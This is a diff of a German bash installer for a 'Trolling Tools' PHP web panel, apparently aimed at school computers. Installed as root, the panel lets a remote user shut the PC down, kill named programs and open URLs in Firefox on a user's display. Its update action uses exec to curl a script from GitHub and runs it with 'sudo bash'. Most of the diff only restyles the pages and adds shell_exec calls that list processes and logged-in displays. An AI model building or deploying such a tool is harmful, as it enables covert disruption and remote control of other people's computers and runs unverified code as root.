@@ -1,6 +1,5 @@
 #!/bin/bash
 
-# Sicherstellen, dass das Skript mit Root-Rechten ausgeführt wird
 if [ "$EUID" -ne 0 ]; then
     echo "Bitte führe das Skript mit Root-Rechten aus (sudo)."
     exit
@@ -9,7 +8,6 @@ fi
 INSTALL_DIR="/var/www/html/trolling"
 KEY_FILE="$INSTALL_DIR/key.txt"
 
-# Funktion für Installation
 install_trolling_tool() {
     echo "==> Installation wird gestartet..."
     read -p "Bitte setze einen sicheren Schlüssel: " key
@@ -25,7 +23,6 @@ install_trolling_tool() {
     configure_permissions
 }
 
-# Funktion für Update
 update_trolling_tool() {
     echo "==> Update wird gestartet..."
     if [ ! -f "$KEY_FILE" ]; then
@@ -38,7 +35,6 @@ update_trolling_tool() {
     echo "==> Update abgeschlossen."
 }
 
-# Funktion für das Einrichten der Webseite
 setup_website() {
     cat <<EOL > "$INSTALL_DIR/index.php"
 <?php
@@ -48,17 +44,65 @@ setup_website() {
 if (\$_POST['key'] !== \$storedKey) {
     echo <<<HTML
     <!DOCTYPE html>
-    <html lang="en">
+    <html lang="de">
     <head>
         <meta charset="UTF-8">
-        <title>Login</title>
+        <title>Login - Trolling Tools</title>
+        <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+        <style>
+            body {
+                font-family: 'Roboto', sans-serif;
+                background-color: #f4f7f6;
+                color: #333;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                height: 100vh;
+                margin: 0;
+            }
+            .container {
+                background-color: #fff;
+                padding: 20px;
+                border-radius: 8px;
+                box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+                width: 300px;
+                text-align: center;
+            }
+            h1 {
+                margin-bottom: 20px;
+                color: #4CAF50;
+            }
+            input {
+                width: 100%;
+                padding: 10px;
+                margin: 10px 0;
+                border: 1px solid #ddd;
+                border-radius: 4px;
+            }
+            button {
+                width: 100%;
+                padding: 10px;
+                background-color: #4CAF50;
+                color: white;
+                border: none;
+                border-radius: 4px;
+                font-size: 16px;
+                cursor: pointer;
+                transition: background-color 0.3s;
+            }
+            button:hover {
+                background-color: #45a049;
+            }
+        </style>
     </head>
-    <body style="text-align: center; font-family: Arial, sans-serif; margin-top: 50px;">
-        <h1>Bitte Schlüssel eingeben</h1>
-        <form method="POST">
-            <input type="password" name="key" placeholder="Schlüssel" required>
-            <button type="submit">Login</button>
-        </form>
+    <body>
+        <div class="container">
+            <h1>Bitte Schlüssel eingeben</h1>
+            <form method="POST">
+                <input type="password" name="key" placeholder="Schlüssel" required>
+                <button type="submit">Login</button>
+            </form>
+        </div>
     </body>
     </html>
     HTML;
@@ -91,7 +135,6 @@ if (\$_SERVER['REQUEST_METHOD'] === 'POST' && isset(\$_POST['action'])) {
         case 'update':
             exec('curl -s https://raw.githubusercontent.com/Terrocraft/ScoolTrolingBash/main/installer.sh -o installer.sh');
             exec('sudo bash installer.sh');
-            exec('2');
             \$response = "Update erfolgreich durchgeführt.";
             break;
 
@@ -104,41 +147,61 @@ if (\$_SERVER['REQUEST_METHOD'] === 'POST' && isset(\$_POST['action'])) {
 ?>
 
 <!DOCTYPE html>
-<html lang="en">
+<html lang="de">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Trolling Tools</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
     <style>
         body {
-            font-family: Arial, sans-serif;
-            background-color: #282c34;
-            color: white;
-            text-align: center;
-            padding: 20px;
+            font-family: 'Roboto', sans-serif;
+            background-color: #f4f7f6;
+            color: #333;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
         }
         .container {
-            max-width: 600px;
-            margin: auto;
-            background-color: #3b4048;
-            border-radius: 8px;
+            background-color: #fff;
             padding: 20px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            width: 400px;
         }
-        input, button {
-            padding: 10px;
-            margin: 10px;
+        h1 {
+            text-align: center;
+            color: #4CAF50;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            background-color: #4CAF50;
+            color: white;
             border: none;
             border-radius: 5px;
             font-size: 16px;
-        }
-        button {
-            background-color: #61dafb;
-            color: #282c34;
             cursor: pointer;
+            transition: background-color 0.3s;
         }
         button:hover {
-            background-color: #21a1f1;
+            background-color: #45a049;
+        }
+        label, input {
+            width: 100%;
+            margin-bottom: 10px;
+        }
+        input {
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+        .datalist {
+            max-height: 100px;
+            overflow-y: scroll;
         }
     </style>
 </head>
@@ -146,15 +209,36 @@ if (\$_SERVER['REQUEST_METHOD'] === 'POST' && isset(\$_POST['action'])) {
     <div class="container">
         <h1>Trolling Tools</h1>
         <form method="POST">
-            <button name="action" value="shutdown">PC Shutdown</button><br>
+            <button name="action" value="shutdown">PC Shutdown</button>
             <label for="program">Programmname (killall):</label>
-            <input type="text" name="program" id="program" placeholder="Programmname">
-            <button name="action" value="killall">Killall</button><br>
+            <input type="text" name="program" id="program" placeholder="Programmname" list="programs">
+            <datalist id="programs" class="datalist">
+                <?php
+                    \$programs = shell_exec("ps -e -o comm");
+                    \$programList = explode("\n", \$programs);
+                    foreach (\$programList as \$program) {
+                        echo "<option value=\"".htmlspecialchars(\$program)."\">";
+                    }
+                ?>
+            </datalist>
+            <button name="action" value="killall">Killall</button>
+
             <label for="display">Display:</label>
-            <input type="text" name="display" id="display" placeholder=":0" value=":0">
+            <input type="text" name="display" id="display" placeholder=":0" list="displays">
+            <datalist id="displays" class="datalist">
+                <?php
+                    \$displays = shell_exec("who | awk '{print \$2}'");
+                    \$displayList = explode("\n", \$displays);
+                    foreach (\$displayList as \$display) {
+                        echo "<option value=\"".htmlspecialchars(\$display)."\">";
+                    }
+                ?>
+            </datalist>
+
             <label for="url">URL:</label>
             <input type="text" name="url" id="url" placeholder="https://example.com">
-            <button name="action" value="open_firefox">Open Firefox</button><br>
+            <button name="action" value="open_firefox">Open Firefox</button>
+
             <button name="action" value="update">Update Tool</button>
         </form>
     </div>
@@ -163,7 +247,6 @@ if (\$_SERVER['REQUEST_METHOD'] === 'POST' && isset(\$_POST['action'])) {
 EOL
 }
 
-# Funktion für Berechtigungen
 configure_permissions() {
     chown -R www-data:www-data "$INSTALL_DIR"
     chmod -R 755 "$INSTALL_DIR"
@@ -171,7 +254,6 @@ configure_permissions() {
     systemctl restart apache2
 }
 
-# Benutzerabfrage für Auswahl
 echo "Bitte wähle eine Option:"
 echo "1. Installiere Trolling-Tool"
 echo "2. Update Trolling-Tool"
